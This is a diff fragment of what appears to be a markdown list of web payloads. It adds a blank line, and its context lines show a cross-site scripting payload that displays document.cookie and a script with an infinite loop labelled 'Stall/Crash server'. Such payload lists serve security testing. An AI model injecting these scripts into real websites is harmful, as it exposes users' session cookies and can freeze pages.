@@ -41,6 +41,7 @@ Onetime XSS:
 ```<script>alert(document.cookie)</script>```
 
 Stall/Crash server:
+
 ```<script>for(;;){}</script>```
 
 Stored XSS:
